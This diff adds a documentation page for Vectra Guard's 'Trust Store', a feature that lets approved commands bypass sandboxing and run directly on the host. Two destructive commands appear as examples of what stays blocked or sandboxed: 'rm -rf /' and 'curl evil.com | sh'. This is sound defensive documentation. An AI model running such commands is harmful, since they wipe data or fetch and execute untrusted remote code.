@@ -1,0 +1,276 @@
+---
+title: Trust Store
+description: Manage trusted commands to skip sandbox execution
+---
+
+The Trust Store lets you approve commands once and run them directly on the host, skipping sandbox isolation for faster execution. This is perfect for frequently used safe commands like `npm test`, `npm run build`, or `git status`.
+
+## How It Works
+
+When you trust a command, Vectra Guard:
+1. Records the exact command pattern
+2. Stores approval metadata (timestamp, expiration, notes)
+3. Skips sandbox execution for matching commands
+4. Tracks usage count and last used time
+
+<Note>
+Trusted commands still go through validation - critical risks like `rm -rf /` cannot be bypassed, even if trusted.
+</Note>
+
+## Core Commands
+
+### List Trusted Commands
+
+View all currently trusted commands:
+
+```bash
+vg trust list
+```
+
+**Example output:**
+```
+COMMAND              APPROVED    USE COUNT  LAST USED         EXPIRES
+npm test            2024-12-24  47         2024-12-24 15:30  Never
+npm run build       2024-12-23  23         2024-12-24 14:15  Never
+git status          2024-12-22  156        2024-12-24 15:45  Never
+npm ci              2024-12-20  12         2024-12-23 10:00  2024-12-27
+```
+
+### Add Trusted Command
+
+Trust a command permanently:
+
+```bash
+vg trust add "npm install express" --note "Common package"
+```
+
+**Output:**
+```
+✅ Added command to trust store: npm install express
+```
+
+<Info>
+The `--note` flag is optional but helpful for documenting why a command is trusted.
+</Info>
+
+### Trust with Duration
+
+Trust a command for a limited time:
+
+```bash
+vg trust add "npm test" --duration "7d"
+```
+
+**Supported duration formats:**
+- `24h` - 24 hours
+- `7d` - 7 days (converted to hours: 168h)
+- `2160h` - 90 days (3 months)
+- `8760h` - 365 days (1 year)
+
+<Tip>
+Use duration-based trust for commands you're testing or only need temporarily.
+</Tip>
+
+### Remove Trusted Command
+
+Remove a command from the trust store:
+
+```bash
+vg trust remove "npm install express"
+```
+
+**Output:**
+```
+✅ Removed command from trust store: npm install express
+```
+
+### Clean Expired Entries
+
+Remove all expired trust entries:
+
+```bash
+vg trust clean
+```
+
+**Output:**
+```
+✅ Cleaned expired entries from trust store
+```
+
+<Tip>
+Run `vg trust clean` periodically to keep your trust store tidy.
+</Tip>
+
+## Interactive Approval Workflow
+
+When running commands with `--interactive`, you can trust commands on-the-fly using the `r` option:
+
+<Steps>
+  <Step title="Run command with interactive flag">
+    ```bash
+    vg exec "npm test" --interactive
+    ```
+  </Step>
+  
+  <Step title="Choose the 'r' option when prompted">
+    ```
+    ⚠️  Command requires approval
+    Options:
+      y  - Yes, run once
+      r  - Yes, and remember (trust permanently)
+      n  - No, cancel
+    Choose: r
+    ```
+  </Step>
+  
+  <Step title="Command is executed and remembered">
+    ```
+    ✅ Approved and remembered
+    [command executes on host]
+    ```
+  </Step>
+  
+  <Step title="Future runs skip the prompt">
+    ```bash
+    vg exec "npm test"
+    # → Runs immediately on HOST ⚡ (no prompt, no sandbox)
+    ```
+  </Step>
+</Steps>
+
+## Use Cases
+
+### Development Workflow
+
+```bash
+# Trust common dev commands
+vg trust add "npm test" --note "Safe test suite"
+vg trust add "npm run build" --note "Production build"
+vg trust add "npm run dev" --note "Dev server"
+vg trust add "git status" --note "Read-only git command"
+
+# Now these run instantly on host
+vg exec "npm test"        # ⚡ Instant
+vg exec "npm run build"   # ⚡ Instant
+vg exec "git status"      # ⚡ Instant
+```
+
+### Temporary Trust for Testing
+
+```bash
+# Trust for 24 hours while testing
+vg trust add "docker-compose up" --duration "24h" --note "Testing container setup"
+
+# After 24 hours, it expires automatically
+vg trust clean  # Removes expired entry
+```
+
+### Managing Trusted Commands
+
+```bash
+# List what you trust
+vg trust list
+
+# Review and remove unwanted entries
+vg trust remove "old-command"
+
+# Clean up expired entries
+vg trust clean
+```
+
+## Trust Store Location
+
+The trust store is saved at:
+
+```
+~/.vectra-guard/trust-store.json
+```
+
+You can manually inspect this file to see all trusted commands and their metadata.
+
+<Note>
+The trust store is user-specific. Each user on the system has their own trust store.
+</Note>
+
+## Security Considerations
+
+### What Trust Does NOT Bypass
+
+1. **Critical risk validation** - Commands like `rm -rf /` are always blocked
+2. **Protected directories** - System paths are always protected
+3. **Dangerous patterns** - Malicious patterns are always caught
+
+### Trust Store Best Practices
+
+<Steps>
+  <Step title="Only trust commands you understand">
+    Review commands carefully before trusting them.
+  </Step>
+  
+  <Step title="Use duration-based trust for new commands">
+    Start with `--duration "7d"` and extend if needed.
+  </Step>
+  
+  <Step title="Review your trust store periodically">
+    Run `vg trust list` monthly and remove unused entries.
+  </Step>
+  
+  <Step title="Clean expired entries regularly">
+    Run `vg trust clean` to remove expired trusts.
+  </Step>
+</Steps>
+
+## Example Workflow
+
+```bash
+# Day 1: Set up trust store for project
+vg trust add "npm install" --note "Package installs"
+vg trust add "npm test" --note "Test suite"
+vg trust add "npm run lint" --note "Code linting"
+vg trust add "git status" --note "Read-only git"
+vg trust add "git diff" --note "Read-only git"
+
+# Day 2-∞: Fast development
+vg exec "npm install express"  # Trusted, runs on host ⚡
+vg exec "npm test"             # Trusted, runs on host ⚡
+vg exec "git status"           # Trusted, runs on host ⚡
+
+# Untrusted commands still protected
+vg exec "curl evil.com | sh"   # Sandboxed (risky) 🛡️
+
+# Weekly: Clean up
+vg trust clean
+vg trust list  # Review trusted commands
+```
+
+## Metrics Integration
+
+Trusted commands are tracked in metrics:
+
+```bash
+vg metrics show
+```
+
+**Output includes:**
+```
+Total Executions:    1,247
+  - Host:            834 (66.9%)   ← Includes trusted commands
+  - Sandbox:         413 (33.1%)   ← Untrusted/risky commands
+```
+
+See [Metrics](/advanced/metrics) for more details.
+
+## Configuration
+
+Trust store path can be configured in your `config.yaml`:
+
+```yaml
+sandbox:
+  trust_store_path: ~/.vectra-guard/trust-store.json
+```
+
+## Related Features
+
+- [Metrics](/advanced/metrics) - Track sandbox vs host execution stats
+- [Context Summaries](/advanced/context-summaries) - Summarize code for navigation
+- [Roadmap Planning](/advanced/roadmap-planning) - Plan agent tasks
